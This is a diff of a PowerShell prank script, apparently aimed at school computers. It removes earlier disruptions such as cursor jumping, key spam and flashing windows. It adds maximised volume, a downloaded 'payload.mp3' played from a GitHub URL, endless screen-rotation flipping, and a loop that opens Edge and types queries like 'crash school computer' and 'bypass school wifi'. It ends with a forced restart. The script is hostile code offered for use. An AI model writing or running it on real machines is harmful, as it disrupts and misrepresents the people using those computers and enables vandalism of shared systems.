@@ -1,87 +1,54 @@
 Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Media
 Add-Type -AssemblyName System.Drawing
-Add-Type -AssemblyName System.Speech
 
-Start-Process "magnify.exe"
-Start-Sleep -Seconds 2
-[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")
+# Set volume to 100%
+$wshell = New-Object -ComObject WScript.Shell
+for ($i = 0; $i -lt 50; $i++) {
+    $wshell.SendKeys([char]175)  # Volume Up key
+    Start-Sleep -Milliseconds 10
+}
 
+# Download and play MP3
+$mp3Path = "$env:TEMP\payload.mp3"
+Invoke-WebRequest -Uri "https://github.com/Anarxyfr/fdsa/raw/refs/heads/main/4b96811d-1725-4694-bf60-c3f3e54b5f94.mp3" -OutFile $mp3Path
+$player = New-Object System.Media.SoundPlayer
+$player.SoundLocation = $mp3Path
+$player.Play()
+
+# Start infinite orientation flipping
 Start-Job -ScriptBlock {
-    $s = New-Object -ComObject SAPI.SpVoice
-    $w = @("a","b","c","d","e","f")
-    for ($i = 0; $i -lt 20; $i++) {
-        $s.Speak(($w | Get-Random))
-        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 400)
+    $keys = @("^{%}{LEFT}","^{%}{RIGHT}","^{%}{UP}","^{%}{DOWN}")
+    while ($true) {
+        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
+        Start-Sleep -Seconds 3
     }
 }
 
+# Spam Edge with search typing
 Start-Job -ScriptBlock {
-    for ($i = 0; $i -lt 50; $i++) {
-        [System.Windows.Forms.MessageBox]::Show("0x" + (Get-Random -Minimum 1000 -Maximum 9999), "x", 0, 48)
-        Start-Sleep -Milliseconds 250
+    Add-Type -AssemblyName System.Windows.Forms
+    $searches = @(
+        "chromebook annihilation",
+        "how to cheat on tests",
+        "how to play games in school",
+        "bypass school wifi",
+        "install games without admin",
+        "crash school computer"
+    )
+    while ($true) {
+        $query = $searches | Get-Random
+        Start-Process "msedge.exe"
+        Start-Sleep -Seconds 2
+        foreach ($char in $query.ToCharArray()) {
+            [System.Windows.Forms.SendKeys]::SendWait($char)
+            Start-Sleep -Milliseconds 30  # ~200WPM
+        }
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+        Start-Sleep -Seconds 3
     }
 }
 
-Start-Job -ScriptBlock {
-    for ($i = 0; $i -lt 100; $i++) {
-        Set-Clipboard ("X" * (Get-Random -Minimum 3 -Maximum 6))
-        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 200)
-    }
-}
-
-Start-Job -ScriptBlock {
-    for ($i = 0; $i -lt 1000; $i++) {
-        $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
-        $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
-        Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 40)
-    }
-}
-
-Start-Job -ScriptBlock {
-    $k = @("A","B","C","D","E","F","1","2","3","4","5")
-    for ($i = 0; $i -lt 1000; $i++) {
-        [System.Windows.Forms.SendKeys]::SendWait(($k | Get-Random))
-        Start-Sleep -Milliseconds (Get-Random -Minimum 5 -Maximum 30)
-    }
-}
-
-Start-Job -ScriptBlock {
-    for ($i = 0; $i -lt 30; $i++) {
-        $f = New-Object Windows.Forms.Form
-        $f.FormBorderStyle = 'None'
-        $f.TopMost = $true
-        $f.WindowState = 'Maximized'
-        $f.BackColor = [System.Drawing.Color]::FromArgb(
-            (Get-Random -Minimum 0 -Maximum 255),
-            (Get-Random -Minimum 0 -Maximum 255),
-            (Get-Random -Minimum 0 -Maximum 255)
-        )
-        $f.Show()
-        Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 160)
-        $f.Close()
-    }
-}
-
-Start-Job -ScriptBlock {
-    $a = @("notepad","calc","mspaint","write","cmd")
-    for ($i = 0; $i -lt 20; $i++) {
-        Start-Process ($a | Get-Random)
-        Start-Sleep -Milliseconds 300
-    }
-}
-
-Start-Job -ScriptBlock {
-    $f = New-Object Windows.Forms.Form
-    $f.Text = "x"
-    $f.BackColor = 'Red'
-    $f.TopMost = $true
-    $f.Width = 300
-    $f.Height = 100
-    $f.Show()
-    Start-Sleep -Seconds 10
-    $f.Close()
-}
-
-Start-Sleep -Seconds 20
-[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")
+# Wait 60 seconds then restart
+Start-Sleep -Seconds 60
+Restart-Computer -Force
